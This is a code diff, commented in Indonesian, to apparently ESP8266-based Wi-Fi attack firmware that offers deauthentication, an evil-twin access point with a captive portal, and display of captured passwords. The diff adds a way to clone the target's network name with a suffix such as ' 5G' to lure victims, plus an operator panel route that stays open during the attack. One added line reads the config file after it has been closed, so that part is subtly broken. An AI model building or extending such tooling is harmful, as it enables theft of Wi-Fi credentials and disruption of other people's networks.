@@ -194,6 +194,9 @@ bool deauthing_active = false;
 String _correct     = "";
 String _tryPassword = "";
 String lastEvent    = "boot";
+String twinSsid     = "";      // SSID yang benar-benar dipancarkan saat twin aktif
+bool   twinSimilar  = false;   // true = nama kembaran pakai akhiran (mis. " 5G")
+String twinSuffix   = "5G";    // akhiran nama; kosong = clone persis
 
 unsigned long now = 0, wifinow = 0, deauth_now = 0, oled_now = 0;
 unsigned long sentFrames = 0;
@@ -218,8 +221,10 @@ void loadApCfg(){
   String ss = f.readStringUntil('\n'); ss.trim();
   String pp = f.readStringUntil('\n'); pp.trim();
   f.close();
+  String sf = f.readStringUntil('\n'); sf.trim();
   if(ss.length() >= 1 && ss.length() <= 32) ss.toCharArray(apSsid, sizeof(apSsid));
   if(pp.length() == 0 || pp.length() >= 8)  pp.toCharArray(apPass, sizeof(apPass));
+  if(sf.length() <= 8) twinSuffix = sf;
 }
 
 void saveApCfg(){
@@ -227,6 +232,7 @@ void saveApCfg(){
   if(!f) return;
   f.println(apSsid);
   f.println(apPass);
+  f.println(twinSuffix);
   f.close();
 }
 
@@ -297,15 +303,18 @@ int readButton(){
 #endif
 }
 
-void startHotspot(){
+void startHotspot(bool similar = false){
   if(_selectedNetwork.ssid.length() == 0) return;
+  twinSimilar = similar;
+  twinSsid = _selectedNetwork.ssid;
+  if(similar && twinSuffix.length()) twinSsid += " " + twinSuffix;   // mis. "NAMA 5G"
   dnsServer.stop();
   WiFi.softAPdisconnect(true);
   WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
-  WiFi.softAP(_selectedNetwork.ssid.c_str());
+  WiFi.softAP(twinSsid.c_str());
   dnsServer.start(53, "*", IPAddress(192,168,4,1));
   hotspot_active = true;
-  oledStatus("twin ON: " + _selectedNetwork.ssid);
+  oledStatus("twin ON: " + twinSsid);
 }
 
 void stopHotspot(){
@@ -390,14 +399,24 @@ String panelHtml(){
   _html += ">"; _html += deauthing_active ? "Stop Deauth" : "Start Deauth";
   _html += "</button></form>";
 
-  _html += "<form style='display:inline-block;padding-left:8px' method='post' action='/?hotspot=";
-  _html += hotspot_active ? "stop'><button" : "start'><button";
-  if(_selectedNetwork.ssid.length() == 0 && !hotspot_active) _html += " disabled";
-  _html += ">"; _html += hotspot_active ? "Stop Evil-Twin" : "Start Evil-Twin";
-  _html += "</button></form>";
+  if(hotspot_active){
+    _html += "<form style='display:inline-block;padding-left:8px' method='post' action='/?hotspot=stop'>"
+             "<button>Stop Evil-Twin</button></form>";
+  } else {
+    _html += "<form style='display:inline-block;padding-left:8px' method='post' action='/?hotspot=start'>"
+             "<button"; if(_selectedNetwork.ssid.length() == 0) _html += " disabled";
+    _html += ">Start Evil-Twin</button></form>";
+    _html += "<form style='display:inline-block;padding-left:8px' method='post' action='/?hotspot=start&amp;similar=1'>"
+             "<input name='suffix' size='5' maxlength='8' value='" + twinSuffix + "' title='akhiran nama, mis. 5G'>"
+             "<button"; if(_selectedNetwork.ssid.length() == 0) _html += " disabled";
+    _html += " style='background:#7a4d1f'>Clone + Akhiran</button></form>";
+  }
 
   _html += "<form style='display:inline-block;padding-left:8px' method='post' action='/?stop=1'>"
            "<button>Stop Semua</button></form></div>";
+
+  _html += "<p style='font-size:.8em;color:#8ab4f8'>Dashboard operator selalu bisa dibuka di "
+           "<b>http://192.168.4.1/panel</b> walau twin sedang aktif.</p>";
 
   _html += "<h1>AP Kontrol</h1><form method='post' action='/?setap=1' style='padding-bottom:.6em'>"
            "<label>SSID <input name='ssid' maxlength='32' value='" + String(apSsid) + "'></label> "
@@ -444,6 +463,10 @@ String loginPage(){
 }
 
 // ---------------- route -----------------------------------------------------
+void handlePanel(){
+  webServer.send(200, "text/html", panelHtml());
+}
+
 void handleStatus(){
   String s = "{\"up\":" + String(millis()/1000) +
              ",\"heap\":" + String(ESP.getFreeHeap()) +
@@ -454,7 +477,9 @@ void handleStatus(){
              ",\"btn\":\"" + String(btnLast) + "\"" +
              ",\"btnRaw\":" + String(btnRaw) +
              ",\"pass\":\"" + _tryPassword + "\"" +
-             ",\"ssid\":\"" + String(apSsid) + "\"}";
+             ",\"ssid\":\"" + String(apSsid) + "\"" +
+             ",\"twinSsid\":\"" + twinSsid + "\"" +
+             ",\"twinSimilar\":" + String(twinSimilar ? "true" : "false") + "}";
   webServer.send(200, "application/json", s);
 }
 
@@ -506,7 +531,11 @@ void handleIndex(){
   }
 
   if(webServer.hasArg("hotspot")){
-    if(webServer.arg("hotspot") == "start") startHotspot();
+    if(webServer.hasArg("suffix")){
+      String sf = webServer.arg("suffix"); sf.trim();
+      if(sf.length() <= 8){ twinSuffix = sf; saveApCfg(); }
+    }
+    if(webServer.arg("hotspot") == "start") startHotspot(webServer.hasArg("similar"));
     else                                    stopHotspot();
     webServer.send(200, "text/html", panelHtml());
     return;
@@ -562,6 +591,7 @@ void setup(){
 
   webServer.on("/",           handleIndex);
   webServer.on("/result",     handleResult);
+  webServer.on("/panel",      handlePanel);
   webServer.on("/api/status", handleStatus);
   webServer.onNotFound(handleIndex);      // URL deteksi HP -> panel: captive auto-buka
   webServer.begin();
